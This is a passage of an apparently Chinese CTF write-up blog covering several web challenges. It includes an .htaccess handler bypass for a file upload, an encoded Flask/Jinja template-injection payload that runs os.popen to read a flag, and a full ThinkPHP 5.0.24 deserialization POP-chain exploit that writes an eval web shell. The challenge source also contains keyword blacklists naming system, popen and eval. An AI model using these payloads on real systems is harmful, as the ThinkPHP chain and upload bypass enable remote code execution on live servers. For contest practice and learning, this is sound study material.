&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;filename is too long!!!&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">31</span>; $i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($i !== <span class="number">10</span> &amp;&amp; stristr($content, chr($i))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;only visible character &quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">127</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (stristr($content, chr($i))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;only visible character &quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$content_blacklist = <span class="keyword">array</span>(<span class="string">&quot;session&quot;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&quot;html&quot;</span>, <span class="string">&quot;type&quot;</span>, <span class="string">&quot;upload&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;prepend&quot;</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;script&quot;</span>, <span class="string">&quot;error&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;zend&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;pcre&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>,<span class="string">&quot;#&quot;</span>, <span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;=&#x27;</span> );</span><br><span class="line"><span class="keyword">foreach</span> ($content_blacklist <span class="keyword">as</span> $keywords) &#123;</span><br><span class="line">    <span class="keyword">if</span> (stristr($content, $keywords)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename_blacklist = <span class="keyword">array</span>(<span class="string">&quot;ph&quot;</span>, <span class="string">&quot;ini&quot;</span>,<span class="string">&#x27;pl&#x27;</span>,<span class="string">&#x27;perl&#x27;</span>,<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;py&quot;</span>);</span><br><span class="line">$append_string = <span class="string">&quot;ohohohohohohohohoh!&quot;</span>;</span><br><span class="line">$yourdir = md5($_COOKIE[<span class="string">&#x27;PHPSESSID&#x27;</span>]);</span><br><span class="line"><span class="keyword">foreach</span> ($filename_blacklist <span class="keyword">as</span> $file_keys) &#123;</span><br><span class="line">    <span class="keyword">if</span> (stristr($filename, $file_keys)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!is_dir($yourdir)) &#123;</span><br><span class="line">    @mkdir($yourdir);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    file_put_contents($yourdir . <span class="string">&#x27;/&#x27;</span> . $filename, $content . $append_string);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;file&#x27;s path:  /var/www/html/&quot;</span>.$yourdir . <span class="string">&#x27;/&#x27;</span> . $filename;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"> <span class="comment">// 过滤了AddType  setHandler  </span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">上传 .htaccess</span><br><span class="line">AddHandler application&#x2F;x-httpd-php .aa .&quot;&quot; 123</span><br><span class="line">&#x2F;&#x2F;AddHandler 居然还能这么用……  涨知识</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; &quot;&quot; 可以起到注释作用</span><br><span class="line">然后使用短标签，传入后缀为.aa的文件，并且使用注释 &#x2F;&#x2F; </span><br></pre></td></tr></table></figure>
+
+<p>菜刀连接</p>
+<p><img src="https://i.loli.net/2020/12/30/Hce1lVCbvQZTKfo.png" alt="image-20201230205613400"></p>
+<h3 id="EZ-pickle"><a href="#EZ-pickle" class="headerlink" title="EZ_pickle"></a>EZ_pickle</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, escape, request </span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io </span><br><span class="line"><span class="keyword">import</span> module_flag </span><br><span class="line">beifen=module_flag.sys.modules </span><br><span class="line">app = Flask(__name__) </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span> </span><br><span class="line">        blackList =[<span class="string">&quot;system&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;global&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;pickle&quot;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;Flask&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;io&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;command&#x27;</span>,<span class="string">&#x27;attr&#x27;</span>,<span class="string">&#x27;dict&#x27;</span>,<span class="string">&#x27;modules&#x27;</span>] </span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> blackList:</span><br><span class="line">            <span class="keyword">if</span> b <span class="keyword">in</span> module <span class="keyword">or</span> b <span class="keyword">in</span> name: </span><br><span class="line">                <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name)) </span><br><span class="line">                <span class="keyword">if</span> module == <span class="string">&#x27;module_flag&#x27;</span> <span class="keyword">and</span> (name[:<span class="number">1</span>] != <span class="string">&#x27;_&#x27;</span>): </span><br><span class="line">                    <span class="keyword">return</span> getattr(module_flag.sys.modules[<span class="string">&#x27;module_flag&#x27;</span>], name) <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name)) </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span> </span><br><span class="line">        res = RestrictedUnpickler(io.BytesIO(s)).load() </span><br><span class="line">        print(module_flag.sys.modules) </span><br><span class="line">        module_flag.sys.modules = beifen </span><br><span class="line">        print(module_flag.sys.modules) </span><br><span class="line">        <span class="keyword">return</span> str(res) </span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;) </span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;view source /src&#x27;</span> </span><br><span class="line"><span class="meta">@app.route(&#x27;/src&#x27;) </span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">src</span>():</span> </span><br><span class="line">        file = open(<span class="string">&quot;/src/app.py&quot;</span>).read() </span><br><span class="line">        <span class="keyword">return</span> file </span><br><span class="line"><span class="meta">@app.route(&#x27;/pickle&#x27;) </span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">NoVulnPickle</span>():</span> </span><br><span class="line">        <span class="keyword">try</span>: </span><br><span class="line">            //代码偶尔能访问，逻辑错误，只过滤了system</span><br><span class="line">            p = request.args.get(<span class="string">&quot;pickle&quot;</span>) </span><br><span class="line">            blackList = [<span class="string">&quot;system&quot;</span> ,<span class="string">&quot;os&quot;</span> ,<span class="string">&quot;popen&quot;</span> , <span class="string">&quot;pickle&quot;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;Flask&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;io&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;command&#x27;</span>,<span class="string">&#x27;attr&#x27;</span>,<span class="string">&#x27;dict&#x27;</span>,<span class="string">&#x27;modules&#x27;</span>,<span class="string">&#x27;global&#x27;</span>] </span><br><span class="line">         <span class="keyword">for</span> b <span class="keyword">in</span> blackList: </span><br><span class="line">            <span class="keyword">if</span> b <span class="keyword">in</span> p: </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;hacker!&quot;</span> </span><br><span class="line">            <span class="keyword">else</span>: </span><br><span class="line">                p = p.encode() </span><br><span class="line">                <span class="comment"># print(p) </span></span><br><span class="line">          		<span class="keyword">return</span> restricted_loads(p) </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e: </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;failed&#x27;</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>: </span><br><span class="line">	app.run(debug=<span class="literal">False</span>,host = <span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="string">&#x27;5000&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>看完代码，一脸懵逼，这题不会，寒假学习:anger: （寒假没了）</p>
+</blockquote>
+<h3 id="EZ-flask"><a href="#EZ-flask" class="headerlink" title="EZ_flask"></a>EZ_flask</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;爆破md5</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">for i in range(100000000):</span><br><span class="line">    i&#x3D;str(i)</span><br><span class="line">    h&#x3D;hashlib.md5()</span><br><span class="line">    h.update(i.encode(encoding&#x3D;&#39;utf-8&#39;))</span><br><span class="line">    a &#x3D; h.hexdigest()</span><br><span class="line">    if( a[0:5] &#x3D;&#x3D; &quot;52491&quot; ):</span><br><span class="line">        print(i)</span><br><span class="line">        break</span><br><span class="line">     &#x2F;&#x2F; 具体md5值按实际情况更改</span><br></pre></td></tr></table></figure>
+
+<p>测试发现题目中 <code>&#123;</code> 和 <code>&#125;</code>  不能同时在一起 ，用户名和后面的参数我们可控，所以分开构造<code>&#123;&#125;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; uasename&#x3D;&#123;&#123;&quot; </span><br><span class="line">session:eyJoYXNoMSI6ImU0ODZhIiwicGFzc3dvcmQiOiIxODkxMzEwIiwic3RhdHVzIjoxLCJ1c2VybmFtZSI6Int7XCIifQ.X-YGjg.2-hzaxNZJk0O-889uMo3wnxMBkE</span><br></pre></td></tr></table></figure>
+
+<p>这里先直接贴出payload；考试后去学习</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;219.219.61.234:50007&#x2F;&quot;|attr(&quot;%c%c%c%c%c%c%c%c%c&quot;%(95,95,99,108,97,115,115,95,95))|attr(&quot;%c%c%c%c%c%c%c%c&quot;%(95,95,98,97,115,101,95,95))|attr(&quot;%c%c%c%c%c%c%c%c%c%c%c%c%c%c&quot;%(95,95,115,117,98,99,108,97,115,115,101,115,95,95))()|attr(&quot;%c%c%c%c%c%c%c%c%c%c%c&quot;%(95,95,103,101,116,105,116,101,109,95,95))(164)|attr(&quot;%c%c%c%c%c%c%c%c&quot;%(95,95,105,110,105,116,95,95))|attr(&quot;%c%c%c%c%c%c%c%c%c%c%c&quot;%(95,95,103,108,111,98,97,108,115,95,95))|attr(&quot;%c%c%c%c%c%c%c%c%c%c%c&quot;%(95,95,103,101,116,105,116,101,109,95,95))(&quot;%c%c%c%c%c%c%c%c%c%c%c%c&quot;%(95,95,98,117,105,108,116,105,110,115,95,95))|attr(&quot;%c%c%c%c%c%c%c%c%c%c%c&quot;%(95,95,103,101,116,105,116,101,109,95,95))(&quot;%c%c%c%c&quot;%(101,118,97,108))(&quot;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c&quot;%(95,95,105,109,112,111,114,116,95,95,40,39,111,115,39,41,46,112,111,112,101,110,40,39,99,97,116,32,47,102,108,97,103,103,103,103,103,103,103,103,103,39,41,46,114,101,97,100,40,41))&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="EZ-thinkphp"><a href="#EZ-thinkphp" class="headerlink" title="EZ_thinkphp"></a>EZ_thinkphp</h3><p>扫描目录，发现源码</p>
+<p><img src="https://i.loli.net/2020/12/26/S9rz6TGBYxalcdC.png" alt="image-20201226123828906"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// www\source\application\index\controller\index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $a=@unserialize(base64_decode(<span class="keyword">$this</span>-&gt;request-&gt;post(<span class="string">&#x27;a&#x27;</span>)));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;thinkphp 5.0.24&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 利用点 </span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/">参考文章</a>  直接白嫖poc :airplane:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">poc</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;files = [<span class="keyword">new</span> Pivot()];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;<span class="comment">#Relation</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Relation</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $selfRelation;</span><br><span class="line">	<span class="keyword">protected</span> $query;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;selfRelation = <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;query = <span class="keyword">new</span> Query();<span class="comment">#class Query</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>;<span class="comment">#OneToOne HasOne</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Relation</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">OneToOne</span> <span class="keyword">extends</span> <span class="title">Relation</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="built_in">parent</span>::__construct();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasOne</span> <span class="keyword">extends</span> <span class="title">OneToOne</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $bindAttr = [];</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="built_in">parent</span>::__construct();</span><br><span class="line">		<span class="keyword">$this</span>-&gt;bindAttr = [<span class="string">&quot;no&quot;</span>,<span class="string">&quot;123&quot;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>;<span class="comment">#Output</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $handle = <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">protected</span> $styles = [];</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Memcached();<span class="comment">//目的调用其write()</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;<span class="comment">#Model</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $append = [];</span><br><span class="line">	<span class="keyword">protected</span> $error;</span><br><span class="line">	<span class="keyword">public</span> $parent;<span class="comment">#修改处</span></span><br><span class="line">	<span class="keyword">protected</span> $selfRelation;</span><br><span class="line">	<span class="keyword">protected</span> $query;</span><br><span class="line">	<span class="keyword">protected</span> $aaaaa;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;parent = <span class="keyword">new</span> Output();<span class="comment">#Output对象,目的是调用__call()</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;append = [<span class="string">&#x27;getError&#x27;</span>];</span><br><span class="line">		<span class="keyword">$this</span>-&gt;error = <span class="keyword">new</span> HasOne();<span class="comment">//Relation子类,且有getBindAttr()</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;selfRelation = <span class="literal">false</span>;<span class="comment">//isSelfRelation()</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;query = <span class="keyword">new</span> Query();</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span>;<span class="comment">#Query</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $model;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;model = <span class="keyword">new</span> Output();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>;<span class="comment">#Memcached</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $handler = <span class="literal">null</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;handler = <span class="keyword">new</span> File();<span class="comment">//目的调用File-&gt;set()</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>;<span class="comment">#File</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $options = [];</span><br><span class="line">	<span class="keyword">protected</span> $tag;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    	<span class="keyword">$this</span>-&gt;options = [</span><br><span class="line">		<span class="string">&#x27;expire&#x27;</span>        =&gt; <span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="literal">false</span>,</span><br><span class="line">		<span class="string">&#x27;prefix&#x27;</span>        =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;path&#x27;</span>          =&gt; <span class="string">&#x27;php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">		];</span><br><span class="line">		<span class="keyword">$this</span>-&gt;tag =<span class="string">&#x27;abcdef&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="comment">//在index.php页面传入值</span></span><br><span class="line"><span class="comment">// 文件的名字是：传入内容+md5(&#x27;tag_&#x27;+md5($tag)).php 并且部分需要urlcode转码</span></span><br><span class="line"><span class="comment">// &lt;%3fcuc cucvasb()%3briny($_TRG[pzq])%3b%3f&gt;468bc8d30505000a2d7d24702b2cda94.php</span></span><br></pre></td></tr></table></figure>
+
+<p>执行命令即可</p>
+<p><img src="https://i.loli.net/2020/12/26/xjLs3Upgi8ctJKY.png" alt="image-20201226140139525"></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="http://example.com">海马少年</a>
+            <p>原文链接：<a href="http://example.com/2020/12/30/CUMT2020-%E5%B2%81%E6%9C%AB%E8%B5%9B/">http://example.com/2020/12/30/CUMT2020-%E5%B2%81%E6%9C%AB%E8%B5%9B/</a>
+            <p>发表日期：<a href="http://example.com/2020/12/30/CUMT2020-%E5%B2%81%E6%9C%AB%E8%B5%9B/">December 30th 2020, 9:44:22 pm</a>
